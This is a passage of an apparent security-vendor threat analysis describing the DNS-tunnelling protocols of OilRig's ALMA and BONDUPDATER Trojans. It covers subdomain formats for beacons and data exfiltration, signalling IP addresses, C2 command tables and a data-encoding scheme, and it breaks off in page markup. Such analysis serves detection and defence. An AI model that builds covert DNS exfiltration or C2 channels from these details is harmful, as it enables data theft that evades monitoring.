<p>The Trojan will continue to treat the IPv4 addresses within the DNS query responses as data until the C2 server responds with the address of “33.33.94[.]94”. Figure 16 shows the C2 server providing data in the form of IPv4 addresses until it the “33.33.94[.]94” address to terminate the data transfer.</p>
<p><img class="alignnone size-full wp-image-96629" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure16.png" alt="" width="974" height="195" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure16.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure16-900x180.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure16-300x60.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure16-768x154.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure16-370x74.png 370w" sizes="(max-width: 974px) 100vw, 974px" /></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 16. ALMA continues to issue queries to download data from the C2 until it receives the 33.33.94[.]94 IPv4 address</em></span></p>
<p>To exfiltrate data from the system to the C2 server, ALMA dash variants will read the contents of the files in the “Uploads” folder and send their contents to the C2 via a series of DNS queries. The DNS queries have a similar structure as the initial beacon, as these requests will start with a random number, the string “ID” and the unique identifier created based on the MD5 hash generated for the system information gathered by the Trojan. The differences include the hardcoded string of “0-2D-2D&#8221;, which is no longer used but will be replaced by the following:</p>
<p><strong>0</strong> – <span style="font-family: 'courier new', courier, monospace;">This will contain the number of DNS queries the Trojan will request to transmit the entire data.</span></p>
<p><strong>2D</strong> – <span style="font-family: 'courier new', courier, monospace;">This will contain 20 or less characters that represent 10-bytes of data from the exfiltrated file in hexadecimal format.</span></p>
<p><strong>2D</strong> – <span style="font-family: 'courier new', courier, monospace;">This will contain 16 or less characters that represent the first 8-bytes of the filename being exfiltrated in hexadecimal format.</span></p>
<p>The resulting structure for the data exfiltration queries is as follows:</p>
<p><span style="font-family: 'courier new', courier, monospace;">[random number between 1-9998]ID[unique identifier from MD5 hash of system information]-[number of requests needed to transfer data]-[20 characters or less for hexlified data]-[16 characters or less for hexlified filename].[c2 domain]</span></p>
<p>Figure 17 and 18 show ALMA communicator exfiltrating data via the DNS tunnel. The two screenshots show the Trojan providing the number “29”, which is the total number of DNS queries it will issue to transmit all of the data. The string “5F446E73496E6974” appears in each of the subdomains, as it is the hexlified representation of the filename “_DnsInit”, which was the name of the batch script provided by the C2 server and executed by the Trojan. The two screenshots show the sequence number after the unique identifier “8faa2150” starting at “1” and incrementing up to “29” when transmitting the data to the C2 server.<img class="alignnone size-full wp-image-96630" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure17.png" alt="" width="974" height="220" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure17.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure17-900x203.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure17-300x68.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure17-768x173.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure17-370x84.png 370w" sizes="(max-width: 974px) 100vw, 974px" /></p>
<p style="text-align: center;"><em><span style="font-size: 10pt;">Figure 17. ALMA beginning the exfiltration of data to the C2 in the queried subdomains</span></em></p>
<p><img class="alignnone size-full wp-image-96631" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure18.png" alt="" width="972" height="185" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure18.png 972w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure18-900x171.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure18-300x57.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure18-768x146.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure18-370x70.png 370w" sizes="(max-width: 972px) 100vw, 972px" /></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 18. ALMA finishing the exfiltration of data to the C2 in the queried subdomains</em></span></p>
<h2>ALMA dot</h2>
<p>This variant of ALMA is very similar to the ALMA dash variant; however, the information sent to the C2 server and specific formatting of the data within the DNS tunneling protocol differ. In addition to the user name and <span style="font-family: 'courier new', courier, monospace;">ProductId</span> gathered by the dash variant of ALMA, the dot variant also gathers the computer name and the serial number of &#8220;\\.\PhysicalDrive&#8221; and concatenates the system information using an underscore (&#8220;_&#8221;) to split up the fields. Like the dash variant, the dot variant generates the MD5 hash of the gathered information and uses it as a unique identifier, but instead of using a shortened version of this hash, the dot variant uses the entire MD5 hash as the unique identifier. The initial beacon to the C2 is structured slightly differently than the dash variant and results in drastically different subdomains, specifically having the following format:</p>
<p><span style="font-family: 'courier new', courier, monospace;">[random number between 1-9999999].MD5 hash for unique identifier].[sequence number].0.2D.2D.[c2 domain]</span></p>
<p>Figure 19 shows a beacon generated by ALMA dot that contains a random number, the MD5 hash of the generated system specific data used as an identifier and a sequence number of 0.<img class="alignnone size-full wp-image-96632" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure19.png" alt="" width="974" height="81" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure19.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure19-900x75.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure19-300x25.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure19-768x64.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure19-370x31.png 370w" sizes="(max-width: 974px) 100vw, 974px" /></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 19. Beacon generated by ALMA dot</em></span></p>
<p>To receive data from the C2, the Trojan will process the IPv4 addresses within the answers to the DNS query. Like, the dash variant, the dot variant of ALMA uses the following two IP addresses to mark the beginning and end of the data transmission:</p>
<p><span style="font-family: 'courier new', courier, monospace;">Start – 36.37.94.33 ($%^!)</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">End – 33.33.94.94 (!!^^)</span></p>
<p>Figure 20 shows the ALMA dot variant using the same IPv4 address of “36.37.94[.]33” to mark the beginning of the data it will download from the C2 server, which in this case is the same batch script “_DnsInit.bat” as mentioned in the ALMA dash section.</p>
<p><img class="alignnone size-full wp-image-96633" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure20.png" alt="" width="974" height="168" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure20.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure20-900x155.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure20-300x52.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure20-768x132.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure20-370x64.png 370w" sizes="(max-width: 974px) 100vw, 974px" /></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 20. ALMA dot using DNS tunnel to download a batch script from the C2 server</em></span></p>
<p>When exfiltrating data via the DNS tunnel, ALMA dot variant has a similar but different structure than the dash variant and can transmit three times the amount of data per request. The following structure shows that the dot variant exfiltrates 60 characters of hexlified data (30 bytes) and another 60 characters of hexlified data (30 bytes) that represents the filename that the data is exfiltrated from:</p>
<p><span style="font-family: 'courier new', courier, monospace;">[random number between 1-9999999](IDID|idid)[MD5 hash for unique identifier].[sequence number].[total count in sequence].[60 or less characters for hexlified data].[60 or less characters for hexlified filename].[c2 domain]</span></p>
<p>Figure 21 shows the ALMA dot variant exfiltrating the results of the batch script downloaded by the C2 server in the previous figure. The figure shows the queries containing a sequence number that increases by one each query until it reaches 8, which is the value in the field in the subdomain that signifies the total number of queries in the sequence. The following field contains 60 characters that represent 30 bytes of hexlified data that the Trojan is sending to the C2. The last field in the subdomain is the hexadecimal string “5F446E73496E69742E747874” that decodes to “_DnsInit.txt”, which is the file that stored the results of the “_DnsInit.bat” script downloaded from the C2 server.</p>
<p><img class="alignnone size-full wp-image-96634" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure21.png" alt="" width="974" height="233" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure21.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure21-900x215.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure21-300x72.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure21-768x184.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure21-370x89.png 370w" sizes="(max-width: 974px) 100vw, 974px" /></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 21. ALMA dot sending the output of the batch script via the DNS tunnel</em></span></p>
<h1>BONDUPDATER</h1>
<p>OilRig has used the BONDUPDATER tool in its attack campaigns as far back as mid-2017 according to <a href="https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html">FireEye’s research</a>. There were two known variants of BONDUPDATER prior to our discovery of a new variant of BONDUPDATER delivered in a targeted attack on a Middle Eastern government organization in August 2018 that we <a href="https://unit42.paloaltonetworks.com/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/">blogged about here</a>. The early variants of variants of BONDUPDATER used DNS A record queries for its DNS tunnel using the “GetHostAddresses” method in the System.Net.Dns class. The later variant of BONDUPDATER relied on raw sockets provided by the System.Net.Sockets.UdpClient class to issue both DNS A and TXT lookups to facilitate the DNS tunnel. The use of multiple DNS query types makes the two BONDUPDATER variants dramatically different, so we will describe each separately.</p>
<h2>Early BONDUPDATER</h2>
<p>The initial BONDUPDATER samples used DNS A queries exclusively to set up its communication tunnel with its C2 server. Depending on the sample, the subdomains generated by this variant of BONDUPDATER would differ slightly, but the overall purpose of this variant of BONDUPDATER is to use a DNS tunnel to download a new PowerShell and/or VBScript script from the C2 to execute.</p>
<p>The initial BONDUPDATER variant issues a beacon in the form of a DNS A request to the C2 server. To build this beacon, the Trojan will create a subdomain that contains a random number, a sequence number and a unique system identifier. The Trojan will first create a unique system identifier by executing the “whoami” command and using the first 12-characters of output as the identifier. The sequence number in the subdomain allows the Trojan to notify the C2 the offset within the data that it is requesting, which is “000” for the initial beacon. The Trojan uses the following structure for the initial beacon:</p>
<p><span style="font-family: 'courier new', courier, monospace;">&lt;random number between 10-99, 1-6 digits worth&gt;&lt;action value, “0” for beacon&gt;&lt;sequence number&gt;&lt;unique system identifier&gt;B007.&lt;C2 domain&gt;</span></p>
<p>If the C2 wishes to send data to the Trojan, it will respond with an IPv4 address within the answer that starts with “24.125” as the first two octets. The Trojan will treat the remaining two octets as characters that it will use as a filename to save the data provided by the C2. The Trojan will use the last character of the filename to determine how to handle the data provided by the C2. Table 4 shows the three values the Trojan will look for as the last digit of the filename (fourth octet of response to the beacon) and how the Trojan will handle the received data.</p>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<td width="163"><strong>Last digit in Filename</strong></td>
<td width="331"><strong>Description</strong></td>
</tr>
<tr>
<td width="163">0</td>
<td width="331">Treat data as PowerShell commands to execute</td>
</tr>
<tr>
<td width="163">1</td>
<td width="331">Write data to &lt;filename&gt;.ps1</td>
</tr>
<tr>
<td width="163">2</td>
<td width="331">Write data to &lt;filename&gt;.vbs</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><em><span style="font-size: 10pt;">Table 4. Commands run based on the trailing character in the filename</span></em></p>
<p>Figure 22 shows the C2 responding with “24.125.0[.]1”, which instructs BONDUPDATER to create a file named “01.ps1” to save the data. If the C2 wishes to terminate the Trojan, it would respond to the beacon with an IPv4 answer of “11.24.237[.]110”.</p>
<p><img class="alignnone size-full wp-image-96635" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure22.png" alt="" width="968" height="156" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure22.png 968w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure22-900x145.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure22-300x48.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure22-768x124.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure22-370x60.png 370w" sizes="(max-width: 968px) 100vw, 968px" /></p>
<p style="text-align: center;"><em><span style="font-size: 10pt;">Figure 22. Original BONDUPDATER beacon and the C2 server responding with a filename and data within the IPv4 answers</span></em></p>
<p>Once it creates the file, BONDUPDATER will begin sending DNS queries to request IPv4 answers that it will treat as data. The Trojan will use the same query structure as the beacon, but will use an action value of “1” and begin incrementing the sequence number in the subdomain by 3 upon each request for data. The sequence number corresponds to the offset of the data that the C2 server will send, which it will transmit three bytes at a time within the first, second and third octets of the IPv4 address. The C2 will provide the current sequence number within the fourth octet of the IPv4 address, which echoes the sequence number back to the Trojan to confirm it is the correct data chunk. Figure 22 also shows the C2 providing IP addresses as answers to next two queries with the first three octets as data and the fourth octet as the sequence number, which the Trojan would save “whoami” to the “01.ps1” file.</p>
<p>If the Trojan successfully downloads the data from the C2 server, it crafts another subdomain that it will query to notify the C2 of the successful data transfer. This subdomain is interesting as it includes the system specific identifier from the beacon, but also includes up to 25-bytes of hexadecimal bytes of the output from the “whoami” command that was used to craft the unique system identifier. We believe that BONDUPDATER would use this structure to transmit data back to the C2 server if desired. The subdomain built for the notification query has the following structure:</p>
<p><span style="font-family: 'courier new', courier, monospace;">&lt;random number between 10-99, 5-10 digits worth&gt;4&lt;sequence number, always “000”&gt;&lt;unique system identifier&gt;B007.&lt;25-bytes of hexlified ‘whoami’ output&gt;.&lt;C2 domain&gt;</span></p>
<p>Figure 23 shows BONDUPDATER notifying the C2 that it downloaded the data, but the figure also shows how the queries would look for data exfiltration.</p>
<p><img class="alignnone size-full wp-image-96636" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure23.png" alt="" width="974" height="66" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure23.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure23-900x61.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure23-300x20.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure23-768x52.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure23-370x25.png 370w" sizes="(max-width: 974px) 100vw, 974px" /></p>
<p style="text-align: center;"><em><span style="font-size: 10pt;">Figure 23. BONDUPDATER sending data to the C2</span></em></p>
<p>The BONDUPDATER Trojan does not run the downloaded PowerShell or VBScript files, instead it relies on the C2 responding to a subsequent beacon with an IPv4 within the answer that starts with “24.125” and the fourth octet containing a “0”. According to Table 4, BONDUPDATER would treat the downloaded data as a PowerShell command, which would allow the actor to run previously downloaded PowerShell and/or VBScript files.</p>
<h2>Updated BONDUPDATER</h2>
<p>The updated BONDUPDATER that OilRig used in a <a href="https://unit42.paloaltonetworks.com/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/">2018 attack on a Middle Eastern government</a> organization had the same DNS tunneling protocol as the previously described variant, however, it could also use a different tunneling protocol that used a combination of DNS A and TXT queries for data transfer.</p>
<p>The updated BONDUPDATER uses the same DNS tunneling protocol using DNS A queries, specifically looking for an IPv4 address starting with “24.125” to get the filename to save the data to and “11.24.237.110” if the C2 wishes to terminate the Trojan. The updated BONDUPDATER also looks for an IPv4 address of “99.250.250.199”, which instructs the Trojan to begin using the alternate DNS tunnel that issues DNS TXT queries to transfer data.</p>
<p>Regardless of which DNS tunneling protocol the Trojan uses, the subdomains crafted have a different structure from the previously known variant. As mentioned in our previous blog:</p>
<p><em>&#8220;The format of the generated domains for both sending and receiving starts with the previously generated GUID created to uniquely identify the system. However, the Trojan inserts a part number value and an action type character into this GUID string at random offsets. The part number value is a three-digit string that corresponds to the chunk of data the Trojan is attempting to transmit. The action type is a single character that notifies the C2 the type of communication the Trojan is carrying out. The two static characters “C” and “T” in the subdomain surround two digits, which help the C2 server find the part number and action type mixed in within the GUID string at random offsets.&#8221;</em></p>
<p>The structure of the subdomains previously described is as follows, with the indexes for the part number and action representing a zero-based indexed string (0 is the first character of the string):</p>
<p><span style="font-family: 'courier new', courier, monospace;">&lt;GUID with part number and action character&gt;&lt;sequence number&gt;&lt;between 1 and 7 random characters&gt;C&lt;index of part number&gt;&lt;index of action&gt;T.&lt;C2 domain&gt;</span></p>
<p>The initial beacon from the Trojan to the C2 uses an action type of “M” and a part number of “000”, as the Trojan is not attempting to transmit any data. Figure 24 shows an example beacon sent from the BONDUPDATER to its C2 server, with the part number “000” at offset 7 and the action “M” at offset 4. It is important to note that if the index of the action is larger than the index of the part number, then the location of the action will be incorrect and will need the length of the part number (3) added to it to find the correct offset.</p>
<p><em> <img class="alignnone size-full wp-image-96637" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure24.png" alt="" width="970" height="124" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure24.png 970w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure24-900x115.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure24-300x38.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure24-768x98.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure24-370x47.png 370w" sizes="(max-width: 970px) 100vw, 970px" /></em></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 24. Updated BONDUPDATER’s initial beacon and the C2 instructing Trojan to use TXT queries</em></span></p>
<p>As you can see in Figure 24, the C2 server responded to the beacon with the IPv4 address “99.250.250[.]199” to instruct BONDUPDATER to use the new TXT-based DNS tunnel. To obtain commands from the C2 server, BONDUPDATER will request a filename from the C2 server via a beacon that uses a DNS TXT query with “W” as the action value. BONDUPDATER will not only use this filename to write downloaded data to, but it will also use the trailing character of the filename as the command to run. Table 5 from our previous blog shows how the Trojan will use the trailing character of the provided filename to carry out specific activities.</p>
<table>
<tbody>
<tr>
<td><strong>Trailing Character/Command</strong></td>
<td><strong>Purpose</strong></td>
<td><strong>Description</strong></td>
</tr>
<tr>
<td>0</td>
<td>Execute command</td>
<td>Reads the contents of the file and runs them as a command with “cmd.exe”. The output of the command is saved to a file whose name starts with “proc” and is stored in the “sendbox” folder, which the Trojan will send to the C2 server.</td>
</tr>
<tr>
<td>1</td>
<td>Download file</td>
<td>Reads the contents of the file for a path to a file to download. Copies the specified file to a file in the “sendbox” folder for the Trojan to send to the C2 server.</td>
</tr>
<tr>
<td>Any other character</td>
<td>Upload file</td>
<td>Used to store a file on the system. The file is moved to the “done” folder, which stores the file for future use. The Trojan writes “200&lt;&gt;[path to stored file]” to a file in the “sendbox” folder to notify the C2 that the file was downloaded successfully.</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 5. Commands available in BONDUPDATER and their purpose</em></span></p>
<p><em> </em>The C2 server will respond to this DNS TXT query with TXT answers that start with an instruction that tells BONDUPDATER how to process the data. Table 6 from our previous blog shows the instructions that the Trojan will parse for within the TXT answer. A greater than (“&gt;”) character will immediately follow the instruction within the TXT answer, in which the Trojan will treat the characters that follow the greater than character as data.</p>
<table>
<tbody>
<tr>
<td><strong>Instruction</strong></td>
<td><strong>Description</strong></td>
</tr>
<tr>
<td>N</td>
<td>Idle. Set action type of next query to “W”</td>
</tr>
<tr>
<td>S</td>
<td>Receive data from C2. Decode data portion as base64. Sets the action type of future queries to the C2 to “D”.</td>
</tr>
<tr>
<td>S000s</td>
<td>Use data to as a portion of the filename to save data to. The data is appended to the string “rcvd”, which will be saved in the “receivebox” folder. Sets the action type of future queries to the C2 to “D”.</td>
</tr>
<tr>
<td>E</td>
<td>Write bytes provided by the “S” command to the file resulting from the “S000s” command. The breaks the loop for the script to process the downloaded file.</td>
</tr>
<tr>
<td>C</td>
<td>Cancel communications by exiting the loop.</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 6. Instructions within the new data transfer process in BONDUPDATER and their meanings</em></span></p>
<p>To execute a command on the system, the C2 would respond to the “W” TXT beacon with the instruction “S000s” followed by the greater than (“&gt;”) character and a filename that ends in a character that ends in “0”. Figure 25 shows the BONDUPDATER issuing a request to obtain a filename from the C2 server by issuing a TXT query with the “W” action at offset 3 in the subdomain. The screenshot also shows the C2 responding to the query with “S000s&gt;10100”, which tells the Trojan to create a file named “rcvd10100”, as the Trojan will append the provided filename to the string “rcvd”.</p>
<p><em> <img class="alignnone size-full wp-image-96638" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure25.png" alt="" width="991" height="118" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure25.png 991w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure25-900x107.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure25-300x36.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure25-768x91.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure25-370x44.png 370w" sizes="(max-width: 991px) 100vw, 991px" /></em></p>
<p style="text-align: center;"><em><span style="font-size: 10pt;">Figure 25. BONDUPDATER requesting a filename to which to save downloaded data</span></em></p>
<p><em> </em>With the filename obtained, the Trojan will begin issuing DNS TXT queries with an action of “D” to download data from the C2. The C2 server will respond to these requests with an instruction of “S0000”, followed by the first chunk of base64 encoded data that is the command. Figure 26 shows BONDUPDATER issuing a TXT query with the “D” action at offset 5 and the C2 server responding with the instruction of “S0000” and the encoded command of “d2hvYW1pJmlwY29uZmlnIC9hbGw=” for the command “whoami&amp;ipconfig /all”.</p>
<p><em> <img class="alignnone size-full wp-image-96639" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure26.png" alt="" width="964" height="104" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure26.png 964w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure26-900x97.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure26-300x32.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure26-768x83.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure26-370x40.png 370w" sizes="(max-width: 964px) 100vw, 964px" /></em></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 26. BONDUPDATER requesting data to download and the C2 providing base64 data</em></span></p>
<p><em> </em>BONDUPDATER waits to receive an instruction from the C2 server that starts with “E” before writing the downloaded data to the supplied filename. After receiving the “E” instruction, the Trojan will write the base64 decoded data to the file and process the newly created file. Figure 27 shows the C2 server providing the “E” instruction within the TXT answer. In the current example, the Trojan would treat the newly saved file as a script thanks to the filename ending with the “0” character. The Trojan would run the contents of the file using “cmd.exe” and save the output to a file named “proc10100” that will be uploaded to the C2 server.</p>
<p><em><img class="alignnone size-full wp-image-96640" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure27.png" alt="" width="970" height="81" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure27.png 970w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure27-900x75.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure27-300x25.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure27-768x64.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure27-370x31.png 370w" sizes="(max-width: 970px) 100vw, 970px" /></em></p>
<p style="text-align: center;"><em><span style="font-size: 10pt;">Figure 27. BONDUPDATER C2 providing an instruction to tell the Trojan to write the data to the file</span></em></p>
<p><em> </em>To upload data to the C2 server, the updated BONDUPDATER variant will use DNS A requests to transmit the data within the crafted subdomain. The structure of this subdomain differs from the DNS A and TXT requests meant to receive data, as these subdomains include segments for the filename and the data itself. To send data to the C2, the Trojan will issue DNS A queries to resolve domains with the following structure:</p>
<p><span style="font-family: 'courier new', courier, monospace;"><em> </em><em>&lt;GUID with part number and action character of “2”&gt;&lt;sequence number&gt;&lt;between 1 and 7 random characters&gt;C&lt;index of part number&gt;&lt;index of action&gt;T.&lt;data chunk&gt;.&lt;filename&gt;.&lt;c2 domain&gt;</em></span></p>
<p>When sending data to the C2, the Trojan will include the character “2” for the action to notify the C2 that it is going to send data. Both the data and filename segments of the subdomain are encoded using an encoding mechanism that takes the following steps:</p>
<ol>
<li>Creates two separate empty strings</li>
<li>Converts each data byte to their hexadecimal form</li>
<li>Splits each hexadecimal byte into two nibbles</li>
<li>Appends the first nibble to the first string</li>
<li>Appends the second nibble to the second string</li>
<li>Concatenates the two strings together</li>
</ol>
<p>This process effectively separates the two characters of each hexadecimal byte and spreads them out across the total string. The filename segment contains the encoded string for the filename with an asterisk (“*”) appended. For instance, the “10100” file seen in Figure 27 above will have an asterisk appended to it to produce “10100*”, which when encoded using this method results in a string of “33333210100A”. The following code block visualizes how this encoding method works:<em> </em></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f692892e1b85558242571" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
String to encode: 10100*

Char '1' is 31 in hex.

 - Put '3' in string 1

 - Put '1' in string 2

Char '0' is 30 in hex.

 - Put '3' in string 1

 - Put '0' in string 2

Char '1' is 31 in hex.

 - Put '3' in string 1

 - Put '1' in string 2

Char '0' is 30 in hex.

 - Put '3' in string 1

 - Put '0' in string 2

Char '0' is 30 in hex.

 - Put '3' in string 1

 - Put '0' in string 2

Char '*' is 2A in hex.

 - Put '2' in string 1

 - Put 'A' in string 2

Concat string 1 “333332” and string 2 “10100A”

Encoded string: 33333210100A</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f692892e1b85558242571-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b85558242571-2">2</div><div class="crayon-num" data-line="crayon-5f692892e1b85558242571-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b85558242571-4">4</div><div class="crayon-num" data-line="crayon-5f692892e1b85558242571-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b85558242571-6">6</div><div class="crayon-num" data-line="crayon-5f692892e1b85558242571-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b85558242571-8">8</div><div class="crayon-num" data-line="crayon-5f692892e1b85558242571-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b85558242571-10">10</div><div class="crayon-num" data-line="crayon-5f692892e1b85558242571-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b85558242571-12">12</div><div class="crayon-num" data-line="crayon-5f692892e1b85558242571-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b85558242571-14">14</div><div class="crayon-num" data-line="crayon-5f692892e1b85558242571-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b85558242571-16">16</div><div class="crayon-num" data-line="crayon-5f692892e1b85558242571-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b85558242571-18">18</div><div class="crayon-num" data-line="crayon-5f692892e1b85558242571-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b85558242571-20">20</div><div class="crayon-num" data-line="crayon-5f692892e1b85558242571-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b85558242571-22">22</div><div class="crayon-num" data-line="crayon-5f692892e1b85558242571-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b85558242571-24">24</div><div class="crayon-num" data-line="crayon-5f692892e1b85558242571-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b85558242571-26">26</div><div class="crayon-num" data-line="crayon-5f692892e1b85558242571-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b85558242571-28">28</div><div class="crayon-num" data-line="crayon-5f692892e1b85558242571-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b85558242571-30">30</div><div class="crayon-num" 